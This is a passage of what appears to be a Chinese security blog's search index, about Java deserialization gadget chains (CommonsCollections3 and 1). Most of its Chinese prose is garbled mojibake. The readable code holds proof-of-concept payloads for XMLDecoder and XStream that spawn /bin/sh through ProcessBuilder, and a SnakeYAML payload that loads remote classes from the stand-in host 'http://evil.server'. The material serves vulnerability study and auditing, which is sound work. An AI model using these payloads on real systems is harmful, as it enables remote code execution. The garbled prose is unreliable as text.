è¿™é‡Œæœ‰ä¸€ç‚¹å¯ä»¥æä¸€ä¸‹ï¼Œè¯¥åˆ©ç”¨é“¾çš„ä½œè€…åœ¨å¡«å……_bytecodesæ—¶ï¼Œé¢å¤–å¡«å……äº†ä¸€ä¸ªæ— å…³çš„ç±»(ä¸Šå›¾ç¬¬130è¡Œ)ã€‚è¿™ä¸ªç±»ä¸»è¦ç”¨äºæ»¡è¶³_auxClasses,è®©è¿™ä¸ªgetTransletInstanceå‡½æ•°èƒ½æ­£å¸¸èµ°å®Œã€‚ ç»è¿‡ä¸Šé¢çš„åˆ†æï¼Œå…¶å®æˆ‘ä»¬å¯ä»¥çŸ¥é“getTransletInstanceçš„ç¬¬408è¡Œï¼Œå¯¹_classåšå®ä¾‹åŒ–æ—¶æˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„ä»£ç å°±å·²ç»æ‰§è¡Œäº†ã€‚æ‰€ä»¥è¿™é‡Œé¢å¤–å¡«å……çš„ç±»å…¶å®æ˜¯å¯æœ‰å¯æ— çš„ã€‚ 0x04 æ€»ç»“åˆ°è¿™é‡Œï¼Œæ•´ä¸€ä¸ªCommonsCollections3å°±åˆ†æç»“æŸäº†ã€‚ CommonsCollections3ä¸»è¦åˆ©ç”¨äº†å¯æ§çš„byteæ•°ç»„ä»defineClasså‡½æ•°ä¸­è¿˜åŸå‡ºæ¶æ„æ„é€ çš„Classã€‚å¹¶ä¸”åœ¨åç»­çš„è°ƒç”¨ä¸­ï¼Œè¿™ä¸ªClassè¢«å®ä¾‹åŒ–ï¼Œä»è€Œæ‰§è¡Œäº†æ³¨å…¥çš„é™æ€å—çš„ä»£ç ï¼Œå®ç°äº†ä»»æ„Javaä»£ç æ‰§è¡Œã€‚ åˆ°è¿™ç¯‡ä¸ºæ­¢ï¼Œæˆ‘ä»¬å·²ç»çŸ¥é“äº†ä¸¤ç§Javaçš„ä»»æ„ä»£ç æ‰§è¡Œçš„æ„é€ æ–¹å¼ åˆ©ç”¨å¯æ§çš„åå°„æœºåˆ¶ã€‚å…·ä½“çš„Classã€Methodç­‰å‡å¯æ§æ—¶ï¼Œåˆ©ç”¨åå°„æœºåˆ¶ï¼Œå¯ä»¥æ„é€ å‡ºä»»æ„çš„ç±»è°ƒç”¨ã€ç±»å‡½æ•°è°ƒç”¨ åˆ©ç”¨å¯æ§çš„defineClasså‡½æ•°çš„byteæ•°ç»„ã€‚æ„é€ æ¶æ„çš„Classå­—èŠ‚ç æ•°ç»„ï¼Œå¸¸äºé™æ€å—æ³¨å…¥æ¶æ„ä»£ç  20191104 è¡¥å……å‰é¢çš„åˆ†æå¹¶æ²¡æœ‰æåˆ°3.2.2ç‰ˆæœ¬å‘ç”Ÿäº†å•¥äº‹ï¼Œå¯¼è‡´äº†åˆ©ç”¨é“¾çš„å¤±æ•ˆï¼Œè¿™é‡Œç®€å•æä¸€ä¸‹ 3.2.2ç‰ˆæœ¬å¯¹InvokerTransformerå¢åŠ äº†readObjectå‡½æ•°ï¼Œå¹¶ä¸”åšäº†æ˜¯å¦å…è®¸ååºåˆ—åŒ–çš„æ£€æŸ¥ï¼Œåœ¨FunctorUtils.checkUnsafeSerializationå‡½æ•°å†…ã€‚ è¿™é‡ŒUNSAFE_SERIALIZABLE_PROPERTYçš„å€¼é»˜è®¤ä¸ºfalseï¼Œå¦‚æœéœ€è¦ä¸ºtrueï¼Œéœ€è¦åœ¨è¿è¡Œæ—¶æŒ‡å®šã€‚ æ‰€ä»¥åœ¨ä½¿ç”¨InvokerTransformerä½œä¸ºååºåˆ—åŒ–åˆ©ç”¨é“¾çš„ä¸€éƒ¨åˆ†æ—¶ï¼Œä¼šthrowä¸€ä¸ªexceptionã€‚é™¤äº†InvokerTransformerç±»å¤–ï¼Œè¿˜æœ‰CloneTransformer, ForClosure, InstantiateFactory, InstantiateTransformer, InvokerTransformer,PrototypeCloneFactory, PrototypeSerializationFactory, WhileClosureã€‚æ‰€ä»¥åœ¨3.2.2ç‰ˆæœ¬ä»¥ä¸Šï¼ŒåŸºæœ¬ä¸Šåˆ©ç”¨é“¾éƒ½å·²ç»åºŸäº†ã€‚ å½“ç„¶ï¼Œè¿™ç§æ–¹æ³•æ²»æ ‡ä¸æ²»æœ¬ï¼Œå¦‚æœå¯ä»¥åœ¨è¿™äº›ç±»ä»¥å¤–ï¼Œæ„é€ ä¸€ä¸ªåˆ©ç”¨é“¾åŒæ ·å¯ä»¥è¾¾åˆ°å‰é¢çš„æ•ˆæœã€‚"},{"title":"ã€notesã€‘Javaååºåˆ—åŒ–åˆ©ç”¨é“¾æŒ–æ˜ä¹‹CommonsCollections1","permalink":"http://blog.0kami.cn/2019/10/24/study-java-deserialized-commonscollections3-1/","text":"0x00 å‰è¨€ å‰æ®µæ—¶é—´åœ¨å¤ç°shiroååºåˆ—åŒ–æ¼æ´çš„è¿‡ç¨‹ä¸­ï¼Œå‘ç°æ— æ³•å¾ˆå¥½çš„ç†è§£CommonCollections4ä¸ºä»€ä¹ˆæ— æ³•æ‰§è¡Œå‘½ä»¤ï¼Œè¿˜æ˜¯ç¼ºå°‘Javaçš„ä¸€äº›åŸºç¡€çŸ¥è¯†ã€‚æ‰€ä»¥è¿™é‡Œå°±å…ˆåœä¸‹äº†å¤ç°æ¼æ´çš„è¿›ç¨‹ï¼Œå…ˆå°†åŸºç¡€æ‰“æ‰å®ï¼šï¼‰ã€‚è¿™ç¯‡æ–‡ç« å°†è®°å½•ï¼ŒJavaååºåˆ—åŒ–æ¼æ´çš„åŸç†ä»¥åŠæµ‹è¯•ç¯å¢ƒã€‚ å‚è€ƒæ–‡çŒ®éƒ½åµŒå…¥åœ¨æ–‡ä¸­ã€‚ 0x01 åŸºç¡€çŸ¥è¯†1. Javaä¸­çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–åºåˆ—åŒ–ï¼šä½¿ç”¨ObjectOutputStreamç±»çš„writeObjectå‡½æ•° 1public final void writeObject(Object x) throws IOException ååºåˆ—åŒ–ï¼šä½¿ç”¨ObjectInputStreamç±»çš„readObjectå‡½æ•° 1public final Object readObject() throws IOException, ClassNotFoundException æ”¯æŒåºåˆ—åŒ–çš„å¯¹è±¡å¿…é¡»æ»¡è¶³ï¼š å®ç°äº†java.io.Serializableæ¥å£ å½“å‰å¯¹è±¡çš„æ‰€æœ‰ç±»å±æ€§å¯åºåˆ—åŒ–ï¼Œå¦‚æœæœ‰ä¸€ä¸ªå±æ€§ä¸æƒ³æˆ–ä¸èƒ½è¢«åºåˆ—åŒ–ï¼Œåˆ™éœ€è¦æŒ‡å®štransientï¼Œä½¿å¾—è¯¥å±æ€§å°†ä¸ä¼šè¢«åºåˆ—åŒ– ä¸¾ä¸ªä¾‹å­(æ¥æºäºæ­¤å¤„) 123456789101112public class Employee implements java.io.Serializable&#123; public String name; public String address; public transient int SSN; public int number; public void mailCheck() &#123; System.out.println(\"Mailing a check to \" + name + \" \" + address); &#125;&#125; 1234567891011121314151617181920212223242526import java.io.*;public class SerializeDemo&#123; public static void main(String [] args) &#123; Employee e = new Employee(); e.name = \"Reyan Ali\"; e.address = \"Phokka Kuan, Ambehta Peer\"; e.SSN = 11122333; e.number = 101; try &#123; FileOutputStream fileOut = new FileOutputStream(\"/tmp/employee.ser\"); ObjectOutputStream out = new ObjectOutputStream(fileOut); out.writeObject(e); out.close(); fileOut.close(); System.out.printf(\"Serialized data is saved in /tmp/employee.ser\"); &#125;catch(IOException i) &#123; i.printStackTrace(); &#125; &#125;&#125; è¿è¡Œåï¼Œç”Ÿæˆemployee.ser æ ¹æ®åºåˆ—åŒ–è§„èŒƒï¼Œacedä»£è¡¨javaåºåˆ—åŒ–æ•°æ®çš„magic wordSTREAM_MAGIC,0005è¡¨ç¤ºç‰ˆæœ¬å·STREAM_VERSION,73è¡¨ç¤ºæ˜¯ä¸€ä¸ªå¯¹è±¡TC_OBJECT,72è¡¨ç¤ºè¿™ä¸ªå¯¹è±¡çš„æè¿°TC_CLASSDESC æ‰€ä»¥åœ¨æ—¥å¸¸æµ‹è¯•ä¸­ï¼Œå¦‚æœè§£å¼€ç±»ä¼¼Base64åï¼Œèµ·å§‹ä¸ºacedæ‰“å¤´ï¼Œå¯ä»¥å°è¯•ä½¿ç”¨ååºåˆ—åŒ–çš„payloadã€‚ åœ¨å¯¹å…¶åšå®Œåºåˆ—åŒ–æ“ä½œåï¼Œæˆ‘ä»¬åœ¨å¦ä¸€ä¸ªJVMä¸­æ¢å¤è¯¥å¯¹è±¡ï¼Œéœ€è¦ç”¨åˆ°ObjectInputStream 12345678910111213141516171819202122232425262728293031import java.io.*;public class DeserializeDemo&#123; public static void main(String [] args) &#123; Employee e = null; try &#123; FileInputStream fileIn = new FileInputStream(\"/tmp/employee.ser\"); ObjectInputStream in = new ObjectInputStream(fileIn); e = (Employee) in.readObject(); in.close(); fileIn.close(); &#125;catch(IOException i) &#123; i.printStackTrace(); return; &#125;catch(ClassNotFoundException c) &#123; System.out.println(\"Employee class not found\"); c.printStackTrace(); return; &#125; System.out.println(\"Deserialized Employee...\"); System.out.println(\"Name: \" + e.name); System.out.println(\"Address: \" + e.address); System.out.println(\"SSN: \" + e.SSN); System.out.println(\"Number: \" + e.number); &#125;&#125; readObjectå‡½æ•°ååºåˆ—åŒ–äº†ä¸Šé¢äº§ç”Ÿçš„äºŒè¿›åˆ¶æ•°æ®æµï¼Œç”Ÿæˆäº†åŸæœ‰çš„å¯¹è±¡æ•°æ®ç»“æ„ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºSSNä¸ºtransientï¼Œå…¶æ— æ³•åºåˆ—åŒ–ï¼Œæ‰€ä»¥è¿˜åŸåå…¶å€¼ä¸º0ã€‚ å¦‚æœåœ¨å¾…åºåˆ—åŒ–ç±»ä¸Šå®ç°äº†readObjectå‡½æ•°ï¼Œååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä¼šè‡ªåŠ¨è°ƒç”¨è¯¥ç±»çš„readObjectå‡½æ•°ã€‚ ä¾‹å¦‚åœ¨Employeeç±»ä¸­æ·»åŠ å‡½æ•°readObject 1234private void readObject(ObjectInputStream in) throws Exception &#123; in.defaultReadObject(); System.out.println(\"Employee call readObject Function\");&#125; åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­å°†è°ƒç”¨è¯¥å‡½æ•° 2. ååºåˆ—åŒ–è§¦å‘ç‚¹æ‰©å±•ä¸Šé¢å±•ç¤ºäº†åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„åŸç†ï¼Œå¹¶ä¸”ååºåˆ—åŒ–çš„è§¦å‘ç‚¹ä¸ºObjectInputStream.readObjectã€‚é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œæ˜¯å¦Javaååºåˆ—åŒ–åªèƒ½ç”±è¯¥ç‚¹è§¦å‘ï¼Ÿç­”æ¡ˆå½“ç„¶æ˜¯å¦å®šçš„ã€‚ é™¤äº†ä¸Šé¢çš„æ–¹æ³•å¤–ï¼Œè¿˜æœ‰å¦‚ä¸‹å‡ ç§è§¦å‘æ–¹å¼ï¼š 1234567ObjectInputStream.readObject// æµè½¬åŒ–ä¸ºObjectObjectInputStream.readUnshared // æµè½¬åŒ–ä¸ºObjectXMLDecoder.readObject // è¯»å–xmlè½¬åŒ–ä¸ºObjectYaml.load// yamlå­—ç¬¦ä¸²è½¬ObjectXStream.fromXML// XStreamç”¨äºJava Objectä¸xmlç›¸äº’è½¬åŒ–ObjectMapper.readValue// jacksonä¸­çš„apiJSON.parseObject// fastjsonä¸­çš„api Note: å¯¹äºreadUnsharedå‡½æ•°ï¼Œå…¶ä¸readObjectå‡½æ•°çš„åŒºåˆ«æš‚æ—¶è¿˜æ²¡å¼„æ˜ç™½ï¼Œå¼•ç”¨ç½‘ä¸Šçš„è§£é‡Š readUnsharedæ–¹æ³•è¯»å–å¯¹è±¡ï¼Œä¸å…è®¸åç»­çš„readObjectå’ŒreadUnsharedè°ƒç”¨å¼•ç”¨è¿™æ¬¡è°ƒç”¨ååºåˆ—åŒ–å¾—åˆ°çš„å¯¹è±¡ï¼Œè€ŒreadObjectè¯»å–çš„å¯¹è±¡å¯ä»¥ã€‚ ä½†å…¶ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä»ç„¶å¯ä»¥è§¦å‘readObjectçš„è°ƒç”¨ï¼Œæœ‰å¾…å¼„æ¸…æ¥šã€‚ 3. æ‰©å±•è§¦å‘ç‚¹è¯•éªŒreadUnsharedå‡½æ•°çš„ä½¿ç”¨æ–¹å¼åŒreadObjectç±»ä¼¼ï¼Œè¿™é‡Œä¸å†å™è¿°ã€‚è¿™ä¸€å°èŠ‚ä¸»è¦è®²å„ç§è§¦å‘ç‚¹çš„åˆ©ç”¨æ–¹å¼ï¼Œä¸è®²å…·ä½“çš„åŸç†ã€‚åŸç†éƒ¨åˆ†ç•™åˆ°åé¢åˆ†æã€‚ a. XMLDecoder.readObject1234567891011public static void main(String[] args)&#123; String poc = \"poc.xml\"; try &#123; FileInputStream file = new FileInputStream(poc); XMLDecoder decoder = new XMLDecoder(file); decoder.readObject(); decoder.close(); &#125; catch (FileNotFoundException e) &#123; e.printStackTrace(); &#125;&#125; poc.xml 1234567891011121314151617&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;java&gt; &lt;object class=\"java.lang.ProcessBuilder\"&gt; &lt;array class=\"java.lang.String\" length=\"3\"&gt; &lt;void index=\"0\"&gt; &lt;string&gt;/bin/sh&lt;/string&gt; &lt;/void&gt; &lt;void index=\"1\"&gt; &lt;string&gt;-c&lt;/string&gt; &lt;/void&gt; &lt;void index=\"2\"&gt; &lt;string&gt;open /Applications/Calculator.app&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method=\"start\"/&gt; &lt;/object&gt;&lt;/java&gt; æœ€ç»ˆå¯è§¦å‘å‘½ä»¤æ‰§è¡Œ b. Yaml.loadå‚è€ƒé“¾æ¥ï¼Œè¿™é‡Œæš‚æœªè¯•éªŒ æ·»åŠ SnakeYAMLåº“ 123456&lt;!-- https://mvnrepository.com/artifact/org.yaml/snakeyaml --&gt;&lt;dependency&gt; &lt;groupId&gt;org.yaml&lt;/groupId&gt; &lt;artifactId&gt;snakeyaml&lt;/artifactId&gt; &lt;version&gt;1.25&lt;/version&gt;&lt;/dependency&gt; 123456public static void main(String[] args) &#123; String yamlStr = \"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader \" + \"[[!!java.net.URL [\\\"http://evil.server\\\"]]]]\"; Yaml yaml = new Yaml(); Object obj = yaml.load(yamlStr);&#125; è¿™é‡Œçš„yamlStrå¯ä»¥ç”¨https://github.com/mbechler/marshalsecç”Ÿæˆå±å®³æ›´å¤§çš„payload c. XStream.fromXMLå‚è€ƒé“¾æ¥ æ·»åŠ XStreamåº“ 12345&lt;dependency&gt; &lt;groupId&gt;com.thoughtworks.xstream&lt;/groupId&gt; &lt;artifactId&gt;xstream&lt;/artifactId&gt; &lt;version&gt;1.4.10&lt;/version&gt;&lt;/dependency&gt; 123456789101112131415161718192021public static void main(String[] args) &#123;// expGen(); String payload = \"&lt;sorted-set&gt;\\n\" + \" &lt;string&gt;foo&lt;/string&gt;\\n\" + \" &lt;dynamic-proxy&gt;\\n\" + \" &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\\n\" + \" &lt;handler class=\\\"java.beans.EventHandler\\\"&gt;\\n\" + \" &lt;target class=\\\"java.lang.ProcessBuilder\\\"&gt;\\n\" + \" &lt;command&gt;\\n\" + \" &lt;string&gt;/bin/sh&lt;/string&gt;\\n\" + \" &lt;string&gt;-c&lt;/string&gt;\\n\" + \" &lt;string&gt;open /System/Applications/Calculator.app&lt;/string&gt;\\n\" + \" &lt;/command&gt;\\n\" + \" &lt;/target&gt;\\n\" + \" &lt;action&gt;start&lt;/action&gt;\"+ \" &lt;/handler&gt;\\n\" + \" &lt;/dynamic-proxy&gt;\\n\" + \"&lt;/sorted-set&gt;\\n\"; XStream xStream = new XStream(); xStream.fromXML(payload); &#125; d. ä¸Šé¢çš„6å’Œ7ï¼Œç•™åˆ°åé¢åˆ†æ4. å°ç»“ä¸Šé¢ä¸¤èŠ‚ä»‹ç»äº†Javaååºåˆ—åŒ–çš„åŸç†ï¼Œå¹¶æ‰©å±•äº†ååºåˆ—åŒ–çš„è§¦å‘ç‚¹ã€‚åœ¨å®é™…çš„å®¡è®¡è¿‡ç¨‹ä¸­ï¼Œå¯ä»¥ç›´æ¥å…³æ³¨è¿™äº›å‡½æ•°çš„è°ƒç”¨ 1(readObject|readUnshared|load|fromXML|readValue|parseObject)\\s*\\( å½“ç„¶æœ‰äº›è¿˜éœ€è¦çœ‹æ˜¯å¦æ˜¯æœ‰æ¼æ´çš„ç‰ˆæœ¬ 0x02 ååºåˆ—åŒ–è¿‡ç¨‹ä¸Šé¢å¤§è‡´è®²è¯‰äº†åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„ä½¿ç”¨æ–¹æ³•ï¼Œæœ¬èŠ‚å°†è°ƒè¯•ä¸Šé¢çš„Employeeæ¡ˆä¾‹ï¼Œæ¥çœ‹çœ‹åœ¨ä»£ç å±‚é¢ååºåˆ—åŒ–è¿‡ç¨‹æ˜¯æ€ä¹ˆæ ·çš„ï¼ è¿™é‡Œä½¿ç”¨çš„æ˜¯ObjectInputStreamçš„ååºåˆ—åŒ–æ–¹æ³•readObjectå‡½æ•° å…¶å®æ•´ä¸€ä¸ªååºåˆ—åŒ–è¿‡ç¨‹æ€»ä½“æ¥è¯´åˆ†ä¸ºä¸¤æ­¥ï¼Œä»å­—ç¬¦ä¸²æµä¸­æ ¹æ®åºåˆ—åŒ–è§„æ ¼æå–å‡ºå¯èƒ½çš„ç±»ï¼Œç„¶åå°†è¯¥ç±»ä½¿ç”¨åå°„æœºåˆ¶æŸ¥æ‰¾æˆ–åˆ›å»ºä¸€ä¸ªå®ä¾‹ã€‚å…¶ä¸­ä¹Ÿä¼šæœ‰ä¸€äº›æ£€æŸ¥çš„è¿‡ç¨‹ï¼Œè¿™é‡Œä¾‹å­æ¯”è¾ƒç®€å•ï¼Œä¸å™è¿°ã€‚ æ¥çœ‹ä¸€ä¸‹æŸ¥æ‰¾æˆ–åˆ›å»ºçš„è¿‡ç¨‹ ObjectInputStream:readObject:417 è·Ÿè¿›ObjectInputStreamçš„readObjectç±»ï¼Œè¯¥å‡½æ•°ä½“ç°äº†æ•´ä¸ªååºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œå…¶ä¸­å…¶ä¸»è¦åŠŸèƒ½çš„æ˜¯readObject0å‡½æ•° ObjectInputStream:readObject0:1515 ä»æµä¸­è¯»å–å‡ºå½“å‰çš„ç±»å‹ï¼Œtc=115æ­¤æ—¶ä»£è¡¨Objectå¯¹è±¡ï¼Œä»è€Œè¿›å…¥readOrdinaryObject ObjectInputStream:readOrdinaryObject:2026 è¯¥å‡½æ•°ä¸»è¦åšäº†å®ä¾‹åŒ–å¯¹è±¡çš„å·¥ä½œï¼Œå…¶ä¸­2033è¡Œç”Ÿæˆçš„ObjectStreamClasså¯¹è±¡ï¼Œä¼šåˆ©ç”¨åå°„æœºåˆ¶å®ä¾‹åŒ–åºåˆ—åŒ–æµä¸­çš„å¯¹è±¡ã€‚2044è¡Œå®é™…çš„è·å–åˆ°è¯¥å¯¹è±¡ã€‚ å…³äºObjectStreamClassçš„åŠŸèƒ½ï¼Œå®ƒæ˜¯ç±»çš„åºåˆ—åŒ–æè¿°å™¨ï¼ŒåŒ…å«ç±»çš„åå­—å’Œåºåˆ—ç‰ˆæœ¬å·ã€‚ä½¿ç”¨å®ƒçš„lookupå‡½æ•°å¯ä»¥è½½å…¥æˆ–æ–°å»ºè¯¥ç±»ï¼Œä½†è¿™é‡Œå®é™…ä¸Šç”¨çš„æ˜¯newInstanceæ¥å®ä¾‹åŒ–å½“å‰çš„åºåˆ—åŒ–æè¿°å™¨ï¼Œå³äº§ç”Ÿå½“å‰æè¿°å™¨æŒ‡ä»£çš„ç±»ã€‚ Serializationâ€™s descriptor for classes. It contains the name and serialVersionUID of the class. The ObjectStreamClass for a specific class loaded in this Java VM can be found/created using the lookup method. å…¶ä¸­å‡½æ•°readClassDescå°†ä»åºåˆ—åŒ–æµä¸­æå–å‡ºç›¸å…³çš„ç±»ä¿¡æ¯ã€‚è¿™é‡Œå°±ç›´æ¥çœ‹åˆ©ç”¨åå°„æœºåˆ¶è·å–åˆ°ç±»çš„åœ°æ–¹ï¼Œä½äºObjectInputStream.resolveClassï¼Œä¸‹å›¾ä¸ºè°ƒç”¨é“¾ ObjectInputStream:resolveClass:677 è¿™é‡Œæå–äº†jvmä¸­å½“å‰è¿™ä¸ªæµä¸­çš„ç±»çš„Classå¯¹è±¡ï¼Œç”¨äºåç»­çš„newInstanceã€‚ æ­¤å¤„æ•´ä¸€ä¸ªåå°„å°±æ˜¯å…ˆé€šè¿‡Class.forNameè·å–åˆ°å½“å‰æè¿°å™¨æ‰€æŒ‡ä»£çš„ç±»çš„Classå¯¹è±¡ï¼Œåç»­ä¼šåœ¨initNonProxyæˆ–initProxyå‡½æ•°ä¸­å¤åˆ¶è¯¥Classå¯¹è±¡çš„ç›¸å…³ä¿¡æ¯(åŒ…æ‹¬ç›¸å…³å‡½æ•°)ï¼Œæœ€ååœ¨2044è¡Œå¤„ObjectStreamClass.newInstanceå®ä¾‹åŒ–è¯¥å¯¹è±¡ã€‚ åœ¨å®ä¾‹åŒ–åä¼šç”¨ObjectInputStream.readSerialDataå‡½æ•°å°†åºåˆ—åŒ–æµä¸­çš„ç›¸å…³æ•°æ®å¡«å……è¿›å®ä¾‹åŒ–åçš„å¯¹è±¡ä¸­æˆ–è°ƒç”¨å½“å‰ç±»æè¿°å™¨çš„readObjectå‡½æ•°ã€‚ ObjectInputStream:readSerialData:2149 è¿™é‡Œä¼šæ ¹æ®å½“å‰çš„ç±»æè¿°å™¨æ˜¯å¦å­˜åœ¨readObjectå‡½æ•°æ¥è‡ªåŠ¨è°ƒç”¨è¯¥å‡½æ•°ï¼Œæˆ–è€…æ˜¯å¡«å……åºåˆ—æµä¸­çš„fieldæ•°æ®ã€‚è¿™é‡Œçš„readObjectçš„è°ƒç”¨å¸¸ä¸ºåˆ©ç”¨é“¾çš„ä¸€éƒ¨åˆ†ï¼Œä¾‹å¦‚CommonsCollections1ä¸­çš„AnnotationInvocationHandlerï¼Œåæ–‡å°†åˆ†æè¯¥å‡½æ•°ã€‚ æ³¨æ„ï¼šç”±äºæˆ‘ä»¬ç”¨çš„æ˜¯Serializableæ¥å£ï¼Œæ‰€ä»¥ä¸Šè¿°å¹¶æœªæåŠä½¿ç”¨Externalizableæ¥å£çš„æƒ…å†µã€‚ åˆ°æ­¤ä¸ºæ­¢ï¼Œæœ€åè¿”å›çš„å¯¹è±¡å°±æ˜¯æœ€ç»ˆæˆ‘ä»¬å¾—åˆ°çš„åºåˆ—åŒ–å‰çš„å¯¹è±¡ã€‚ å°ç»“è¿™é‡Œå¼•ç”¨æµ…è°ˆJavaååºåˆ—åŒ–æ¼æ´ä¿®å¤æ–¹æ¡ˆ Javaç¨‹åºä¸­ç±»ObjectInputStreamçš„readObjectæ–¹æ³•è¢«ç”¨æ¥å°†æ•°æ®æµååºåˆ—åŒ–ä¸ºå¯¹è±¡ï¼Œå¦‚æœæµä¸­çš„å¯¹è±¡æ˜¯classï¼Œåˆ™å®ƒçš„ObjectStreamClassæè¿°ç¬¦ä¼šè¢«è¯»å–ï¼Œå¹¶è¿”å›ç›¸åº”çš„classå¯¹è±¡ï¼ŒObjectStreamClassåŒ…å«äº†ç±»çš„åç§°åŠserialVersionUIDã€‚ å¦‚æœç±»æè¿°ç¬¦æ˜¯åŠ¨æ€ä»£ç†ç±»ï¼Œåˆ™è°ƒç”¨resolveProxyClassæ–¹æ³•æ¥è·å–æœ¬åœ°ç±»ã€‚å¦‚æœä¸æ˜¯åŠ¨æ€ä»£ç†ç±»åˆ™è°ƒç”¨resolveClassæ–¹æ³•æ¥è·å–æœ¬åœ°ç±»ã€‚å¦‚æœæ— æ³•è§£æè¯¥ç±»ï¼Œåˆ™æŠ›å‡ºClassNotFoundExceptionå¼‚å¸¸ã€‚ å¦‚æœååºåˆ—åŒ–å¯¹è±¡ä¸æ˜¯Stringã€arrayã€enumç±»å‹ï¼ŒObjectStreamClassåŒ…å«çš„ç±»ä¼šåœ¨æœ¬åœ°è¢«æ£€ç´¢ï¼Œå¦‚æœè¿™ä¸ªæœ¬åœ°ç±»æ²¡æœ‰å®ç°java.io.Serializableæˆ–è€…externalizableæ¥å£ï¼Œåˆ™æŠ›å‡ºInvalidClassExceptionå¼‚å¸¸ã€‚å› ä¸ºåªæœ‰å®ç°äº†Serializableå’ŒExternalizableæ¥å£çš„ç±»çš„å¯¹è±¡æ‰èƒ½è¢«åºåˆ—åŒ–ã€‚ å‰é¢åˆ†æä¸­æåˆ°æœ€åä¼šè°ƒç”¨resolveClassè·å–ç±»çš„Classå¯¹è±¡ï¼Œè¿™æ˜¯ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä¸€ä¸ªé‡è¦çš„åœ°æ–¹ï¼Œä¹Ÿæ˜¯å¿…ç»ä¹‹è·¯ï¼Œæ‰€ä»¥æœ‰ç ”ç©¶äººå‘˜æå‡ºé€šè¿‡é‡è½½ObjectInputStreamçš„resolveClassæ¥é™åˆ¶å¯ä»¥è¢«ååºåˆ—åŒ–çš„ç±» 0x03 åˆ©ç”¨é“¾å‘æ˜åŒPHPçš„ååºåˆ—åŒ–ä¸€æ ·ï¼Œå•å•å‘ç°ååºåˆ—åŒ–çš„è§¦å‘ç‚¹å¹¶ä¸èƒ½é€ æˆä¸¥é‡çš„å½±å“ã€‚å¾€å¾€ååºåˆ—åŒ–æ¼æ´çš„å±å®³ç¨‹åº¦å–å†³äºåç»­çš„ååºåˆ—åŒ–åˆ©ç”¨é“¾æ‰€èƒ½è¾¾åˆ°çš„å±é™©ç¨‹åº¦ã€‚åœ¨javaä¸­ysoserialå·¥å…·ç»™æˆ‘ä»¬æä¾›äº†è®¸å¤šå¸¸è§çš„åº“å­˜åœ¨çš„åˆ©ç”¨é“¾ï¼Œè¿™ä¸€èŠ‚å°†é€ä¸€åˆ†æè¿™äº›åˆ©ç”¨é“¾ã€‚ 1. CommonsCollections1(jdk&lt;=7)å‚è€ƒé“¾æ¥ Apache Commons Collectionsæ˜¯ä¸€ä¸ªæ‰©å±•äº†Javaæ ‡å‡†åº“é‡Œçš„Collectionç»“æ„çš„ç¬¬ä¸‰æ–¹åŸºç¡€åº“ï¼Œå®ƒæä¾›äº†å¾ˆå¤šå¼ºæœ‰åŠ›çš„æ•°æ®ç»“æ„ç±»å‹å¹¶ä¸”å®ç°äº†å„ç§é›†åˆå·¥å…·ç±»ã€‚ä½œä¸ºApacheå¼€æºé¡¹ç›®çš„é‡è¦ç»„ä»¶ï¼ŒCommons Collectionsè¢«å¹¿æ³›åº”ç”¨äºå„ç§Javaåº”ç”¨çš„å¼€å‘ã€‚ CommonsCollection1çš„åˆ†ææ–‡ç« æ¯”è¾ƒå¤šï¼Œåˆšå¼€å§‹å…ˆä»è¿™ä¸ªgadgetå¼€å§‹åˆ†æã€‚è¿™é‡Œæˆ‘ç”¨çš„åˆ†ææ–¹æ³•æ˜¯å…ˆå†™ä¸€ä¸ªè§¦å‘ç‚¹ï¼Œç„¶åç”¨ysoserialç”Ÿæˆpayloadæ¥è°ƒè¯•ã€‚ CommonsCollections1 payloadé’ˆå¯¹çš„commons-collections 3.1ç‰ˆæœ¬ï¼Œå…ˆå¼•å…¥åº“ 123456&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;&lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.1&lt;/version&gt;&lt;/dependency&gt; åœ¨ysoserialçš„expä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€æ•´ä¸ªè°ƒç”¨çš„é“¾ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åˆ©ç”¨é“¾çš„æœ€åè°ƒç”¨äº†Runtime.getRuntime().exec()ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬éœ€è¦åœ¨å‰ä¸€æ­¥çš„é“¾ä¸Šå¯ä»¥è¾¾åˆ°è°ƒç”¨ä»»æ„ç±»å’Œæ–¹æ³•çš„å‡½æ•°ã€‚ CommonsCollections1ç”¨çš„å°±æ˜¯3.1ç‰ˆæœ¬ä¸‹çš„InvokerTransformer.transform() 1234567891011121314151617public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); &#125; catch (NoSuchMethodException ex) &#123; throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' does not exist\"); &#125; catch (IllegalAccessException ex) &#123; throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' cannot be accessed\"); &#125; catch (InvocationTargetException ex) &#123; throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' threw an exception\", ex); &#125;&#125; 